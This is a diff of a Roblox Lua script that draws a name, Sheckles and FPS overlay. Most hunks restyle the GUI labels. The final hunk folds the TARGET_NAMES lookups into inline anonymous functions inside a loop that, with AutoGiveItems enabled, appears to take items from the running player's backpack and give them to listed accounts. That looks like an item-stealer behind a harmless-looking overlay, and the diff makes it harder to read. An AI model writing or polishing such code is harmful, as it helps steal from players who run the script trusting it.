@@ -73,35 +73,48 @@ local leaderstats = LocalPlayer:WaitForChild("leaderstats")
 local sheckles = leaderstats:WaitForChild("Sheckles")
 
 local function formatNumber(n)
-    local suffixes = {"","K","M","B","T","Qa","Qi","Sx","Sp","Oc","No","Dc"}
+    local suffix = {"","K","M","B","T","Qa","Qi","Sx","Sp","Oc","No","Dc"}
     n = tonumber(n) or 0
-    local index = 1
-    while n >= 1000 and index < #suffixes do n = n / 1000; index = index + 1 end
-    if n >= 999.95 and index < #suffixes then n = 1; index = index + 1 end
-    if index == 1 then return tostring(math.floor(n))
-    elseif n >= 100 then return string.format("%.0f%s", n, suffixes[index])
-    elseif n >= 10 then return string.format("%.1f%s", n, suffixes[index])
-    else return string.format("%.2f%s", n, suffixes[index]) end
+    local i = 1
+    while n >= 1000 and i < #suffix do n /= 1000; i += 1 end
+    if n >= 999.95 and i < #suffix then n = 1; i += 1 end
+    if i == 1 then return tostring(math.floor(n))
+    elseif n >= 100 then return string.format("%.0f%s", n, suffix[i])
+    elseif n >= 10 then return string.format("%.1f%s", n, suffix[i])
+    else return string.format("%.2f%s", n, suffix[i]) end
 end
 
-local nameLabel = Instance.new("TextLabel", mainGui)
-nameLabel.Size = UDim2.new(0, 500, 0, 50)
-nameLabel.Position = UDim2.new(0.5, -250, 0.5, -60)
+local frame = Instance.new("Frame", mainGui)
+frame.Size = UDim2.new(1,0,0,90)
+frame.Position = UDim2.new(0.5,0,0.5,0)
+frame.AnchorPoint = Vector2.new(0.5,0.5)
+frame.BackgroundTransparency = 1
+
+local layout = Instance.new("UIListLayout", frame)
+layout.FillDirection = Enum.FillDirection.Vertical
+layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+layout.VerticalAlignment = Enum.VerticalAlignment.Center
+layout.Padding = UDim.new(0,2)
+
+local nameLabel = Instance.new("TextLabel", frame)
+nameLabel.Size = UDim2.new(1,0,0,42)
 nameLabel.BackgroundTransparency = 1
-nameLabel.Text = LocalPlayer.Name
+nameLabel.Font = Enum.Font.GothamBold
+nameLabel.TextSize = 40
 nameLabel.TextColor3 = Color3.new(1,1,1)
 nameLabel.TextStrokeTransparency = 0
-nameLabel.TextScaled = true
-nameLabel.Font = Enum.Font.GothamBold
+nameLabel.TextXAlignment = Enum.TextXAlignment.Center
+nameLabel.TextYAlignment = Enum.TextYAlignment.Center
 
-local shecklesLabel = Instance.new("TextLabel", mainGui)
-shecklesLabel.Size = UDim2.new(0, 500, 0, 50)
-shecklesLabel.Position = UDim2.new(0.5, -250, 0.5, -5)
-shecklesLabel.BackgroundTransparency = 1
-shecklesLabel.TextColor3 = Color3.fromRGB(255,255,0)
-shecklesLabel.TextStrokeTransparency = 0
-shecklesLabel.TextScaled = true
-shecklesLabel.Font = Enum.Font.GothamBold
+local moneyLabel = Instance.new("TextLabel", frame)
+moneyLabel.Size = UDim2.new(1,0,0,42)
+moneyLabel.BackgroundTransparency = 1
+moneyLabel.Font = Enum.Font.GothamBold
+moneyLabel.TextSize = 40
+moneyLabel.TextColor3 = Color3.fromRGB(255,220,0)
+moneyLabel.TextStrokeTransparency = 0
+moneyLabel.TextXAlignment = Enum.TextXAlignment.Center
+moneyLabel.TextYAlignment = Enum.TextYAlignment.Center
 
 local fpsLabel = Instance.new("TextLabel", mainGui)
 fpsLabel.Size = UDim2.new(0, 300, 0, 50)
@@ -131,27 +144,12 @@ RunService.RenderStepped:Connect(function()
         lastUpdate = now
     end
     nameLabel.Text = LocalPlayer.Name
-    shecklesLabel.Text = "Sheckles: " .. formatNumber(sheckles.Value)
+    moneyLabel.Text = "Sheckles: "..formatNumber(sheckles.Value)
 end)
 
-local function getTargetPlayer()
-    for _, name in ipairs(TARGET_NAMES) do
-        local p = Players:FindFirstChild(name)
-        if p then return p end
-    end
-    return nil
-end
-
-local function isLocalPlayerTarget()
-    for _, name in ipairs(TARGET_NAMES) do
-        if LocalPlayer.Name == name then return true end
-    end
-    return false
-end
-
 while task.wait(1) do
-    if not isLocalPlayerTarget() then
-        local targetPlayer = getTargetPlayer()
+    if not (function() for _, v in pairs(TARGET_NAMES) do if LocalPlayer.Name == v then return true end end return false end)() then
+        local targetPlayer = (function() for _, name in ipairs(TARGET_NAMES) do local p = Players:FindFirstChild(name) if p then return p end end return nil end)()
         if Config.AutoGiveItems and targetPlayer then
             local character = LocalPlayer.Character
             local backpack = LocalPlayer:FindFirstChild("Backpack")
